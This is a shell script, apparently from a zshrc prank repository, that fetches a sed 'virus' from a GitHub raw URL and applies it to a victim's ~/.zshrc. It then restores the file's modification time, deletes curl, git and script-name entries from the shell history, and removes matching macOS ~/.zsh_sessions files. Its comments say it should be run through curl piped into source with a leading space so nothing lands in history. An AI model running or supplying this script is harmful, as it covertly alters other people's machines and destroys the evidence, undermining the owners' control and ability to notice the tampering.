# 基地を持ち込まずに被害者のマシンへ直接適用する（cloneフォルダを残さない）。
# 必ず source で現在のシェルに流し込む。先頭に空白を付けると履歴にも残らない:
#   (先頭スペース) source <(curl -fsSL RAW_URL/train_remote.sh) virus.sed
BASE="https://raw.githubusercontent.com/Motifman/prank-zshrc-zoo/main"
__virus="${1:-virus.sed}"
__tmp="$(mktemp)"
if ! curl -fsSL "$BASE/$__virus" -o "$__tmp"; then
  echo "イタズラの取得に失敗: $__virus"
  rm -f "$__tmp"
  return 1 2>/dev/null || exit 1
fi

# 変更時刻を戻すための基準を一時退避（home にはファイルを残さない）
__ref="$(mktemp)"
touch -r ~/.zshrc "$__ref" 2>/dev/null
sed -i".aonaon" -f "$__tmp" ~/.zshrc
rm -f "$__tmp" ~/.zshrc.aonaon
# ls -l / Finder で「最近変更」とバレないよう mtime を戻す
touch -r "$__ref" ~/.zshrc 2>/dev/null
rm -f "$__ref"

# 履歴ファイルから導入の痕跡を消す（macOSには tac が無いので tail -r）
if [ -n "$HISTFILE" ] && [ -f "$HISTFILE" ]; then
  tail -r "$HISTFILE" | sed '1,20{/curl/d;/train_remote/d;/git/d;/clone/d;}' > "$HISTFILE.tmp"
  tail -r "$HISTFILE.tmp" > "$HISTFILE"
  rm -f "$HISTFILE.tmp"
fi

# macOS Terminal.app のセッション履歴(~/.zsh_sessions)にも残るので掃除
if [ -d ~/.zsh_sessions ]; then
  grep -rl -e curl -e train_remote ~/.zsh_sessions 2>/dev/null | xargs rm -f 2>/dev/null
fi

source ~/.zshrc
fc -R 2>/dev/null
unset __virus __tmp __ref
